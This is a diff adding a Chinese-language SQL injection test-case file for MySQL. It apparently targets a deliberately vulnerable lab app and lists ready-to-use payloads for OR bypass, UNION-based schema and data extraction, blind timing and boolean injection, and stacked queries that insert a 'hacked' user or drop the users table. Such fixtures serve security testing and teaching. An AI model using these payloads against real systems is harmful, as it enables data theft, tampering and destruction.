@@ -1,0 +1,83 @@
+# SQL Injection 漏洞测试用例
+# 目标数据库: MySQL 8.0
+
+# ============================================
+# 1. JDBC 直接拼接注入
+# ============================================
+# 端点: /sqli/jdbc/vuln?username={payload}
+
+# 正常请求 - 验证基础功能
+username=admin
+
+# OR 注入 - 万能密码 (应返回所有用户)
+username=admin' OR '1'='1
+
+# OR 注入 - 数字型
+username=1' OR '1'='1
+
+# 注释符绕过
+username=admin'-- -
+
+# UNION 注入 - 确定列数
+username=1' UNION SELECT 1,2,3,4--
+
+# UNION 注入 - 读取数据库信息
+username=1' UNION SELECT database(),user(),version(),@@version_compile_os--
+
+# UNION 注入 - 读取表名
+username=1' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()--
+
+# 时间盲注 - SLEEP
+username=1' AND SLEEP(3)--
+
+# 布尔盲注
+username=admin' AND LENGTH(database())=8--
+
+# 堆叠查询
+username=admin'; INSERT INTO users(username,password) VALUES('hacked','123')--
+
+
+# ============================================
+# 2. LIKE 子句注入
+# ============================================
+# 端点: /sqli/like/vuln?username={payload}
+
+# LIKE OR 注入
+username=admin%' OR '1'='1
+
+# LIKE 通配符注入
+username=%
+
+# LIKE 注释注入
+username=admin'--
+
+
+# ============================================
+# 3. ORDER BY 子句注入
+# ============================================
+# 端点: /sqli/order/vuln?sort={payload}
+
+# 正常排序
+sort=id
+
+# 布尔盲注
+sort=1 AND 1=1
+
+# 时间盲注
+sort=1;SELECT SLEEP(3)--
+
+# 堆叠查询
+sort=1; DROP TABLE users--
+
+# 报错注入
+sort=1 AND (SELECT 1 UNION SELECT 2)
+
+
+# ============================================
+# 验证方法
+# ============================================
+# 成功的注入特征:
+# 1. OR '1'='1 返回所有用户记录
+# 2. UNION 注入返回额外数据
+# 3. SLEEP(3) 导致明显延迟
+# 4. 堆叠查询修改数据库结构
